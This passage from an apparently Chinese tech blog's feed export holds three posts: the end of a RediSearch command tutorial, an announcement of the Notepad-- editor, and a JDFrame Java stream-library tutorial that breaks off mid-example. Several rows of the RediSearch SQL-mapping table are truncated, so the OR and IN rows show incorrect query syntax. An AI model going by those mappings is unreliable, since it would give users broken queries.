&quot;18563717107&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">sql</th><th align="center">redisearch</th></tr></thead><tbody><tr><td align="center">WHERE x&#x3D;‘foo’ AND y&#x3D;‘bar’</td><td align="center">@x:foo @y:bar</td></tr><tr><td align="center">WHERE x&#x3D;‘foo’ AND y!&#x3D;‘bar’</td><td align="center">@x:foo -@y:bar</td></tr><tr><td align="center">WHERE x&#x3D;‘foo’ OR y&#x3D;‘bar’</td><td align="center">(@x:foo)</td></tr><tr><td align="center">WHERE x IN (‘foo’, ‘bar’,‘hello world’)</td><td align="center">@x:(foo</td></tr><tr><td align="center">WHERE y&#x3D;‘foo’ AND x NOT IN (‘foo’,‘bar’)</td><td align="center">@y:foo (-@x:foo) (-@x:bar)</td></tr><tr><td align="center">WHERE x NOT IN (‘foo’,‘bar’)</td><td align="center">-@x:(foo</td></tr><tr><td align="center">WHERE num BETWEEN 10 AND 20</td><td align="center">@num:[10 20]</td></tr><tr><td align="center">WHERE num &gt;&#x3D; 10</td><td align="center">@num:[10 +inf]</td></tr><tr><td align="center">WHERE num &gt; 10</td><td align="center">@num:[(10 +inf]</td></tr><tr><td align="center">WHERE num &lt; 10</td><td align="center">@num:[-inf (10]</td></tr><tr><td align="center">WHERE num &lt;&#x3D; 10</td><td align="center">@num:[-inf 10]</td></tr><tr><td align="center">WHERE num &lt; 10 OR num &gt; 20</td><td align="center">@num:[-inf (10]</td></tr><tr><td align="center">WHERE name LIKE ‘john%’</td><td align="center">@name:john*</td></tr></tbody></table><h4 id="1-4-删除"><a href="#1-4-删除" class="headerlink" title="1.4 删除"></a>1.4 删除</h4><h5 id="1-3-1-删除文档"><a href="#1-3-1-删除文档" class="headerlink" title="1.3.1 删除文档"></a>1.3.1 删除文档</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.del student 002  </span><br><span class="line">&quot;1&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="1-3-3-删除索引"><a href="#1-3-3-删除索引" class="headerlink" title="1.3.3 删除索引"></a>1.3.3 删除索引</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.drop student  </span><br><span class="line">&quot;OK&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-5-查看"><a href="#1-5-查看" class="headerlink" title="1.5 查看"></a>1.5 查看</h4><h5 id="1-5-1-查看所有索引"><a href="#1-5-1-查看所有索引" class="headerlink" title="1.5.1 查看所有索引"></a>1.5.1 查看所有索引</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;FT._LIST  </span><br><span class="line">1) &quot;student1&quot;  </span><br><span class="line">2) &quot;ttao&quot;  </span><br><span class="line">3) &quot;idx&quot;  </span><br><span class="line">4) &quot;student&quot;  </span><br><span class="line">5) &quot;myidx&quot;  </span><br><span class="line">6) &quot;123&quot;  </span><br><span class="line">7) &quot;myIndex&quot;  </span><br><span class="line">8) &quot;testung&quot;  </span><br><span class="line">9) &quot;student2&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="1-5-2-查看索引文档中的数据"><a href="#1-5-2-查看索引文档中的数据" class="headerlink" title="1.5.2 查看索引文档中的数据"></a>1.5.2 查看索引文档中的数据</h5><h6 id="1-5-2-1-获取单条数据"><a href="#1-5-2-1-获取单条数据" class="headerlink" title="1.5.2.1 获取单条数据"></a>1.5.2.1 获取单条数据</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.get student 001  </span><br><span class="line">1) &quot;name&quot;  </span><br><span class="line">2) &quot;张三&quot;  </span><br><span class="line">3) &quot;sex&quot;  </span><br><span class="line">4) &quot;男&quot;  </span><br><span class="line">5) &quot;desc&quot;  </span><br><span class="line">6) &quot;这是一个学生&quot;  </span><br><span class="line">7) &quot;class&quot;  </span><br><span class="line">8) &quot;一班&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="1-5-2-2-获取多条数据"><a href="#1-5-2-2-获取多条数据" class="headerlink" title="1.5.2.2 获取多条数据"></a>1.5.2.2 获取多条数据</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;ft.mget student 001 002  </span><br><span class="line">1) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;张三&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;  </span><br><span class="line">   7) &quot;class&quot;  </span><br><span class="line">   8) &quot;一班&quot;</span><br><span class="line"></span><br><span class="line">2) 1) &quot;name&quot;  </span><br><span class="line">   2) &quot;张三&quot;  </span><br><span class="line">   3) &quot;sex&quot;  </span><br><span class="line">   4) &quot;男&quot;  </span><br><span class="line">   5) &quot;desc&quot;  </span><br><span class="line">   6) &quot;这是一个学生&quot;  </span><br><span class="line">   7) &quot;class&quot;  </span><br><span class="line">   8) &quot;一班&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-6-索引别名操作"><a href="#1-6-索引别名操作" class="headerlink" title="1.6 索引别名操作"></a>1.6 索引别名操作</h4><h5 id="1-6-1-添加别名"><a href="#1-6-1-添加别名" class="headerlink" title="1.6.1 添加别名"></a>1.6.1 添加别名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123.232.112.84:0&gt;FT.ALIASADD xs student  </span><br><span class="line">&quot;OK&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给索引student起个xs的别名，一个索引可以起多个别名</p><h5 id="1-6-2-修改别名"><a href="#1-6-2-修改别名" class="headerlink" title="1.6.2 修改别名"></a>1.6.2 修改别名</h5><h5 id="1-6-3-删除别名"><a href="#1-6-3-删除别名" class="headerlink" title="1.6.3 删除别名"></a>1.6.3 删除别名</h5><pre><code>123.232.112.84:0&gt;FT.ALIASDEL xs   &quot;OK&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis官方搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>因为看不惯Notepad++，国内大佬开源了Notepad--</title>
      
      <link href="/2024/08/11/%E5%9B%A0%E4%B8%BA%E7%9C%8B%E4%B8%8D%E6%83%AFNotepad-%EF%BC%8C%E5%9B%BD%E5%86%85%E5%A4%A7%E4%BD%AC%E5%BC%80%E6%BA%90%E4%BA%86Notepad/"/>
      <url>/2024/08/11/%E5%9B%A0%E4%B8%BA%E7%9C%8B%E4%B8%8D%E6%83%AFNotepad-%EF%BC%8C%E5%9B%BD%E5%86%85%E5%A4%A7%E4%BD%AC%E5%BC%80%E6%BA%90%E4%BA%86Notepad/</url>
      
        <content type="html"><![CDATA[<p>Notepad– 是使用C++编写的轻量级文本编辑器, 简称ndd, 可以支持Window&#x2F;Mac&#x2F;Linux操作系统平台。</p><p>我们的目标：完成文本编辑类软件的国产可替代，重点在国产Uos&#x2F;Linux系统、Mac 系统上发展。</p><p>对比其它竞品Notepad类软件而言，我们的优势是可以跨平台，支持linux mac操作系统。</p><p><strong>鉴于某些Notepad竞品作者的不当言论，Notepad–的意义在于：</strong></p><p><strong>减少一点错误言论，减少一点自以为是。</strong></p><p><strong>Notepad–的目标：致力于国产软件的可替代，专心做软件。</strong></p><p>您可以在这个项目提交bug或反馈问题。</p><h2 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h2><p><strong>windows效果图：</strong></p><p><img src="/./2024/08/11/%E5%9B%A0%E4%B8%BA%E7%9C%8B%E4%B8%8D%E6%83%AFNotepad-%EF%BC%8C%E5%9B%BD%E5%86%85%E5%A4%A7%E4%BD%AC%E5%BC%80%E6%BA%90%E4%BA%86Notepad/1.png"></p><p><img src="/./2024/08/11/%E5%9B%A0%E4%B8%BA%E7%9C%8B%E4%B8%8D%E6%83%AFNotepad-%EF%BC%8C%E5%9B%BD%E5%86%85%E5%A4%A7%E4%BD%AC%E5%BC%80%E6%BA%90%E4%BA%86Notepad/2.png"></p><p><img src="/./2024/08/11/%E5%9B%A0%E4%B8%BA%E7%9C%8B%E4%B8%8D%E6%83%AFNotepad-%EF%BC%8C%E5%9B%BD%E5%86%85%E5%A4%A7%E4%BD%AC%E5%BC%80%E6%BA%90%E4%BA%86Notepad/3.png"></p><p>文件对比<br><img src="/./2024/08/11/%E5%9B%A0%E4%B8%BA%E7%9C%8B%E4%B8%8D%E6%83%AFNotepad-%EF%BC%8C%E5%9B%BD%E5%86%85%E5%A4%A7%E4%BD%AC%E5%BC%80%E6%BA%90%E4%BA%86Notepad/4.png"></p><p>最新版本下载地址：</p><p><a href="https://gitee.com/cxasm/notepad--">https://gitee.com/cxasm/notepad--</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Notepad-- </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>ava8的Stream流太难用了？看看JDFrame</title>
      
      <link href="/2024/08/11/ava8%E7%9A%84Stream%E6%B5%81%E5%A4%AA%E9%9A%BE%E7%94%A8%E4%BA%86%EF%BC%9F%E7%9C%8B%E7%9C%8BJDFrame/"/>
      <url>/2024/08/11/ava8%E7%9A%84Stream%E6%B5%81%E5%A4%AA%E9%9A%BE%E7%94%A8%E4%BA%86%EF%BC%9F%E7%9C%8B%E7%9C%8BJDFrame/</url>
      
        <content type="html"><![CDATA[<p>由于经常记不住stream的一些API每次要复制来复制去并且又长又臭，想要更加语意化的api，于是想到了以前写大数据Spark pandnas 等DataFrame模型时的API， 然后发现其实也存在java的JVM层的DataFrame模型比如 tablesaw，joinery</p><p>但是他们得硬编码去指定字段名，这对于有代码洁癖的人实在难以忍受，而且我只是简单统计下数据，我想在一些场景下能不能使用匿名函数去指定的字段处理去处理，于是便有了这个</p><p>一个jvm层级的仿DataFrame工具，语意化和简化java8的stream流式处理工具</p><h1 id="1、快速开始"><a href="#1、快速开始" class="headerlink" title="1、快速开始"></a>1、快速开始</h1><h2 id="1-1、引入依赖"><a href="#1-1、引入依赖" class="headerlink" title="1.1、引入依赖"></a>1.1、引入依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;io.github.burukeyou&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;jdframe&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;0.0.6&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2、案例"><a href="#1-2、案例" class="headerlink" title="1.2、案例"></a>1.2、案例</h2><p>统计每个学校的里学生年龄不为空并且年龄在9到16岁间的合计分数，并且获取合计分前2名的学校</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static List&lt;Student&gt; studentList = new ArrayList&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">static &#123;  </span><br><span class="line">    studentList.add(new Student(1,&quot;a&quot;,&quot;一中&quot;,&quot;一年级&quot;,11, new BigDecimal(1)));  </span><br><span class="line">    studentList.add(new Student(2,&quot;a&quot;,&quot;一中&quot;,&quot;一年级&quot;,11, new BigDecimal(1)));  </span><br><span class="line">    studentList.add(new Student(3,&quot;b&quot;,&quot;一中&quot;,&quot;三年级&quot;,12, new BigDecimal(2)));  </span><br><span class="line">    studentList.add(new Student(4,&quot;c&quot;,&quot;二中&quot;,&quot;一年级&quot;,13, new BigDecimal(3)));  </span><br><span class="line">    studentList.add(new Student(5,&quot;d&quot;,&quot;二中&quot;,&quot;一年级&quot;,14, new BigDecimal(4)));  </span><br><span class="line">    studentList.add(new Student(6,&quot;e&quot;,&quot;三中&quot;,&quot;二年级&quot;,14, new BigDecimal(5)));  </span><br><span class="line">    studentList.add(new Student(7,&quot;e&quot;,&quot;三中&quot;,&quot;二年级&quot;,15, new BigDecimal(5)));  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">// 等价于SQL:  </span><br><span class="line">//       select school,sum(score)    </span><br><span class="line">//       from students  </span><br><span class="line">//       where age is not null and age &gt;=9 and age &lt;= 16  </span><br><span class="line">//       group by school  </span><br><span class="line">//       order by sum(score) desc  </span><br><span class="line">//       limit 2  </span><br><span class="line">SDFrame&lt;FI2&lt;String, BigDecimal&gt;&gt; sdf2 = SDFrame.read(studentList)  </span><br><span class="line">    .whereNotNull(Student::getAge)  </span><br><span class="line">    .whereBetween(Student::getAge,9,16)  </span><br><span class="line">    .groupBySum(Student::getSchool, Student::getScore)  </span><br><span class="line">    .sortDesc(FI2::getC2)  </span><br><span class="line">    .cutFirst(2);  </span><br><span class="line">  </span><br><span class="line">sdf2.show();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出信息;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1  c2   </span><br><span class="line">三中 10   </span><br><span class="line">二中 7  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Data  </span><br><span class="line">@AllArgsConstructor  </span><br><span class="line">@NoArgsConstructor  </span><br><span class="line">public class Student &#123;  </span><br><span class="line">  </span><br><span class="line">  private int id;  </span><br><span class="line">  private String name;  </span><br><span class="line">  private String school;  </span><br><span class="line">  private String level;  </span><br><span class="line">  private Integer age;  </span><br><span class="line">  private BigDecimal score;  </span><br><span class="line">  </span><br><span class="line">  private Integer rank;  </span><br><span class="line">  </span><br><span class="line">  public Student(String level, BigDecimal score) &#123;  </span><br><span class="line">      this.level = level;  </span><br><span class="line">      this.score = score;  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  public Student(int id, String name, String school, String level, Integer age, BigDecimal score) &#123;  </span><br><span class="line">      this.id = id;  </span><br><span class="line">      this.name = name;  </span><br><span class="line">      this.school = school;  </span><br><span class="line">      this.level = level;  </span><br><span class="line">      this.age = age;  </span><br><span class="line">      this.score = score;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2、API案例"><a href="#2、API案例" class="headerlink" title="2、API案例"></a>2、API案例</h1><h2 id="2-1、矩阵查看相关"><a href="#2-1、矩阵查看相关" class="headerlink" title="2.1、矩阵查看相关"></a>2.1、矩阵查看相关</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void show(int n); // 打印矩阵信息到控制台  </span><br><span class="line">List&lt;String&gt; columns();   // 获取矩阵的表头字段名  </span><br><span class="line">List&lt;R&gt; col(Function&lt;T, R&gt; function);   // 获取矩阵某一列值  </span><br><span class="line">T head();                   // 获取第一个元素  </span><br><span class="line">List&lt;T&gt; head(int n);          // 获取前n个元素  </span><br><span class="line">T tail();                       // 获取最后一个元素  </span><br><span class="line">List&lt;T&gt; tail(int n);            // 获取后n个元素  </span><br><span class="line">List&lt;T&gt; page(int page,int pageSize) // 获取分页数据  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-2、筛选相关"><a href="#2-2、筛选相关" class="headerlink" title="2.2、筛选相关"></a>2.2、筛选相关</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SDFrame.read(studentList)  </span><br><span class="line">.whereBetween(Student::getAge,3,6) // 过滤年龄在[3，6]岁的  </span><br><span class="line">.whereBetweenR(Student::getAge,3,6) // 过滤年龄在(3，6]岁的, 不含3岁  </span><br><span class="line">.whereBetweenL(Student::getAge,3,6)      // 过滤年龄在[3，6)岁的, 不含6岁  </span><br><span class="line">.whereNotNull(Student::getName) // 过滤名字不为空的数据， 兼容了空字符串&#x27;&#x27;的判断  </span><br><span class="line">.whereGt(Student::getAge,3)    // 过滤年龄大于3岁  </span><br><span class="line">.whereGe(Student::getAge,3)   // 过滤年龄大于等于3岁  </span><br><span class="line">.whereLt(Student::getAge,3)  // 过滤年龄小于3岁的  </span><br><span class="line">.whereIn(Student::getAge, Arrays.asList(3,7,8)) // 过滤年龄为3岁 或者7岁 或者 8岁的数据  </span><br><span class="line">.whereNotIn(Student::getAge, Arrays.asList(3,7,8)) // 过滤年龄不为为3岁 或者7岁 或者 8岁的数据  </span><br><span class="line">.whereEq(Student::getAge,3) // 过滤年龄等于3岁的数据  </span><br><span class="line">.whereNotEq(Student::getAge,3) // 过滤年龄不等于3岁的数据  </span><br><span class="line">.whereLike(Student::getName,&quot;jay&quot;) // 模糊查询，等价于 like &quot;%jay%&quot;  </span><br><span class="line">.whereLikeLeft(Student::getName,&quot;jay&quot;) // 模糊查询，等价于 like &quot;jay%&quot;  </span><br><span class="line">.whereLikeRight(Student::getName,&quot;jay&quot;); // 模糊查询，等价于 like &quot;%jay&quot;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-3、汇总相关"><a href="#2-3、汇总相关" class="headerlink" title="2.3、汇总相关"></a>2.3、汇总相关</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDFrame&lt;Student&gt; frame = JDFrame.read(studentList);  </span><br><span class="line">Student s1 = frame.max(Student::getAge);// 获取年龄最大的学生  </span><br><span class="line">Integer s2  = frame.maxValue(Student::getAge);      // 获取学生里最大的年龄  </span><br><span class="line">Student s3 = frame.min(Student::getAge);// 获取年龄最小的学生  </span><br><span class="line">Integer s4  = frame.minValue(Student::getAge);      // 获取学生里最小的年龄  </span><br><span class="line">BigDecimal s5 = frame.avg(Student::getAge); // 获取所有学生的年龄的平均值  </span><br><span class="line">BigDecimal s6 = frame.sum(Student::getAge); // 获取所有学生的年龄合计  </span><br><span class="line">MaxMin&lt;Student&gt; s7 = frame.maxMin(Student::getAge); // 同时获取年龄最大和最小的学生  </span><br><span class="line">MaxMin&lt;Integer&gt; s8 = frame.maxMinValue(Student::getAge); // 同时获取学生里最大和最小的年龄  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-4、去重相关"><a href="#2-4、去重相关" class="headerlink" title="2.4、去重相关"></a>2.4、去重相关</h2><p>原生steam只支持对象去重，不支持按特定字段去重</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java  </span><br><span class="line">  </span><br><span class="line"> 代码解读  </span><br><span class="line">复制代码List&lt;Student&gt; std = null;  </span><br><span class="line">std = SDFrame.read(studentList).distinct().toLists(); // 根据对象hashCode去重  </span><br><span class="line">std = SDFrame.read(studentList).distinct(Student::getSchool).toLists(); // 根据学校名去重  </span><br><span class="line">std = SDFrame.read(studentList).distinct(e -&gt; e.getSchool() + e.getLevel()).toLists(); // 根据学校名拼接级别去重复  </span><br><span class="line">std =SDFrame.read(studentList).distinct(Student::getSchool).distinct(Student::getLevel).toLists(); // 先根据学校名去除重复再根据级别去除重复  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-5、分组聚合相关"><a href="#2-5、分组聚合相关" class="headerlink" title="2.5、分组聚合相关"></a>2.5、分组聚合相关</h2><p>类似sql的 group by语义 简化处理分组和聚合的逻辑， 如果用原生stream需要写可能一大串逻辑.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDFrame&lt;Student&gt; frame = JDFrame.from(studentList);  </span><br><span class="line">// 等价于 select school,sum(age) ... group by school  </span><br><span class="line">List&lt;FI2&lt;String, BigDecimal&gt;&gt; a = frame.groupBySum(Student::getSchool, Student::getAge).toLists();  </span><br><span class="line">// 等价于 select school,max(age) ... group by school  </span><br><span class="line">List&lt;FI2&lt;String, Integer&gt;&gt; a2 = frame.groupByMaxValue(Student::getSchool, Student::getAge).toLists();  </span><br><span class="line">//  与 groupByMaxValue 含义一致，只是返回的是最大的值对象  </span><br><span class="line">List&lt;FI2&lt;String, Student&gt;&gt; a3 = frame.groupByMax(Student::getSchool, Student::getAge).toLists();  </span><br><span class="line">// 等价于 select school,min(age) ... group by school  </span><br><span class="line">List&lt;FI2&lt;String, Integer&gt;&gt; a4 = frame.groupByMinValue(Student::getSchool, Student::getAge).toLists();  </span><br><span class="line">// 等价于 select school,count(*) ... group by school  </span><br><span class="line">List&lt;FI2&lt;String, Long&gt;&gt; a5 = frame.groupByCount(Student::getSchool).toLists();  </span><br><span class="line">// 等价于 select school,avg(age) ... group by school  </span><br><span class="line">List&lt;FI2&lt;String, BigDecimal&gt;&gt; a6 = frame.groupByAvg(Student::getSchool, Student::getAge).toLists();  </span><br><span class="line">  </span><br><span class="line">// 等价于 select school,sum(age),count(age) group by school  </span><br><span class="line">List&lt;FI3&lt;String, BigDecimal, Long&gt;&gt; a7 = frame.groupBySumCount(Student::getSchool, Student::getAge).toLists();  </span><br><span class="line">  </span><br><span class="line">// (二级分组)等价于 select school,level,sum(age),count(age) group by school,level  </span><br><span class="line">List&lt;FI3&lt;String, String, BigDecimal&gt;&gt; a8 = frame.groupBySum(Student::getSchool, Student::getLevel, Student::getAge).toLists();  </span><br><span class="line">  </span><br><span class="line">// （三级分组）等价于 select school,level,name,sum(age),count(age) group by school,level,name  </span><br><span class="line">List&lt;FI4&lt;String, String, String, BigDecimal&gt;&gt; a9 = frame.groupBySum(Student::getSchool, Student::getLevel, Student::getName, Student::getAge).toLists();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-6、排序相关"><a href="#2-6、排序相关" class="headerlink" title="2.6、排序相关"></a>2.6、排序相关</h2><p>简化原生stream的排序方式，直接指定字段即可，不用使用Comparator还要去关注升序还是降序. 如果是多级排序使用Compartor或者Sorter去指定多级排序的逻辑。Sorter也是Compartor的一种实现，只是提供了更加语义化的多级排序指定逻辑， 相当于内置了Compartor的thenComparing</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 等价于 order by age desc  </span><br><span class="line">SDFrame.read(studentList).sortDesc(Student::getAge);  </span><br><span class="line">//  (多级排序) 等价于 order by age desc, level asc.   </span><br><span class="line">SDFrame.read(studentList).sortAsc(Sorter.sortDescBy(Student::getAge).sortAsc(Student::getLevel));  </span><br><span class="line">// 等价于 order by age asc  </span><br><span class="line">SDFrame.read(studentList).sortAsc(Student::getAge);  </span><br><span class="line">// 使用Comparator 排序  </span><br><span class="line">SDFrame.read(studentList).sortAsc(Comparator.comparing(e -&gt; e.getLevel() + e.getId()));  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-7、连接矩阵相关"><a href="#2-7、连接矩阵相关" class="headerlink" title="2.7、连接矩阵相关"></a>2.7、连接矩阵相关</h2><p>API列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">append(T t);                    // 等价于集合 add  </span><br><span class="line">union(IFrame&lt;T&gt; other);         //  等价于集合 addAll  </span><br><span class="line">join(IFrame&lt;K&gt; other, JoinOn&lt;T,K&gt; on, Join&lt;T,K,R&gt; join);   // 等价于 sql内连接  </span><br><span class="line">leftJoin(IFrame&lt;K&gt; other, JoinOn&lt;T,K&gt; on, Join&lt;T,K,R&gt; join);   // 等价于sql左连接，如果左连接失败，K值为null，需手动判断  </span><br><span class="line">rightJoin(IFrame&lt;K&gt; other, JoinOn&lt;T,K&gt; on, Join&lt;T,K,R&gt; join);    // 等价于sql右连接，如果右连接失败，T值为null，需手动判断  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>内连接例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;======== 矩阵1 =======&quot;);  </span><br><span class="line">  </span><br><span class="line">SDFrame&lt;Student&gt; sdf = SDFrame.read(studentList);  </span><br><span class="line">  </span><br><span class="line">sdf.show(20);  </span><br><span class="line">  </span><br><span class="line">// 获取学生年龄在9到16岁的学学校合计分数最高的前10名  </span><br><span class="line">SDFrame&lt;FI2&lt;String, BigDecimal&gt;&gt; sdf2 = SDFrame.read(studentList)  </span><br><span class="line">      .whereNotNull(Student::getAge)  </span><br><span class="line">      .whereBetween(Student::getAge,9,16)  </span><br><span class="line">      .groupBySum(Student::getSchool, Student::getScore)  </span><br><span class="line">      .sortDesc(FI2::getC2)  </span><br><span class="line">      .cutFirst(10);  </span><br><span class="line">  </span><br><span class="line">System.out.println(&quot;======== 矩阵2 =======&quot;);  </span><br><span class="line">sdf2.show();  </span><br><span class="line">  </span><br><span class="line">SDFrame&lt;UserInfo&gt; frame = sdf.join(sdf2, (a, b) -&gt; a.getSchool().equals(b.getC1()), (a, b) -&gt; &#123;  </span><br><span class="line">  UserInfo userInfo = new UserInfo();  </span><br><span class="line">  userInfo.setKey1(a.getSchool());  </span><br><span class="line">  userInfo.setKey2(b.getC2().intValue());  </span><br><span class="line">  userInfo.setKey3(String.valueOf(a.getId()));  </span><br><span class="line">  return userInfo;  </span><br><span class="line">&#125;);  </span><br><span class="line">  </span><br><span class="line">System.out.println(&quot;======== 连接后结果 =======&quot;);  </span><br><span class="line">frame.show(5);  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打印信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">======== 矩阵1 =======  </span><br><span class="line">id name school level age score rank   </span><br><span class="line">1  a    一中     一年级   11  1            </span><br><span class="line">2  a    一中     一年级   11  1            </span><br><span class="line">3  b    一中     一年级   12  2            </span><br><span class="line">4  c    二中     一年级   13  3            </span><br><span class="line">5  d    二中     一年级   14  4            </span><br><span class="line">6  e    三中     二年级   14  5            </span><br><span class="line">7  e    三中     二年级   15  5            </span><br><span class="line">  </span><br><span class="line">======== 矩阵2 =======  </span><br><span class="line">c1 c2   </span><br><span class="line">三中 10   </span><br><span class="line">二中 7    </span><br><span class="line">一中 4    </span><br><span class="line">  </span><br><span class="line">======== 连接后结果 =======  </span><br><span class="line">key1 key2 key3 key4   </span><br><span class="line">一中   4    1           </span><br><span class="line">一中   4    2           </span><br><span class="line">一中   4    3           </span><br><span class="line">二中   7    4           </span><br><span class="line">二中   7    5  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类似于</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a.*,b.* from sdf a inner join sdf2 b on  a.school = b.c1  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-8、截取相关"><a href="#2-8、截取相关" class="headerlink" title="2.8、截取相关"></a>2.8、截取相关</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cutFirst(int n); // 截取前N个  </span><br><span class="line">cutLast(int n); // 截取后N个  </span><br><span class="line">cut(Integer startIndex,Integer endIndex) // 按照索引范围截取 [startIndex,endIndex). 等价于 List.subList  </span><br><span class="line">cutPage(int page,int pageSize)      // 按分页截取  </span><br><span class="line">cutFirstRank(Sorter&lt;T&gt; sorter, int n);    // 截取前N排名的数据  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-9、Frame参数设置相关"><a href="#2-9、Frame参数设置相关" class="headerlink" title="2.9、Frame参数设置相关"></a>2.9、Frame参数设置相关</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaultScale(int scale, RoundingMode roundingMode); // 设置计算结果的默认小数精度  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-10、其他"><a href="#2-10、其他" class="headerlink" title="2.10、其他"></a>2.10、其他</h2><h3 id="百分数转换"><a href="#百分数转换" class="headerlink" title="百分数转换"></a>百分数转换</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 等价于 select round(score*100,2) from student  </span><br><span class="line">SDFrame&lt;Student&gt; map2 = SDFrame.read(studentList).mapPercent(Student::getScore, Student::setScore,2);  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><p>将每个5个元素分成一个小集合，用于将大任务拆成小任务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;List&lt;Student&gt;&gt; t = SDFrame.read(studentList).partition(5).toLists();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="生成序号列"><a href="#生成序号列" class="headerlink" title="生成序号列"></a>生成序号列</h3><p>按照age排序，然后根据当前顺序生成排序号到rank字段 （序号从1开始）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SDFrame.read(studentList)  </span><br><span class="line">    .sortDesc(Student::getAge)  </span><br><span class="line">    .addRowNumberCol(Student::setRank)  </span><br><span class="line">    .show(30);  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id name school level age score rank   </span><br><span class="line">7  e    三中     二年级   15  5     1      </span><br><span class="line">5  d    二中     一年级   14  4     2      </span><br><span class="line">6  e    三中     二年级   14  5     3      </span><br><span class="line">4  c    二中     一年级   13  3     4      </span><br><span class="line">3  b    一中     三年级   12  2     5      </span><br><span class="line">1  a    一中     一年级   11  1     6      </span><br><span class="line">2  a    一中     一年级   11  1     7  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="补充条目"><a href="#补充条目" class="headerlink" title="补充条目"></a>补充条目</h3><p>1、补充缺失的学校条目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 所有需要的学校条目  </span><br><span class="line">List&lt;String&gt; allDim = Arrays.asList(&quot;一中&quot;,&quot;二中&quot;,&quot;三中&quot;,&quot;四中&quot;);  </span><br><span class="line">// 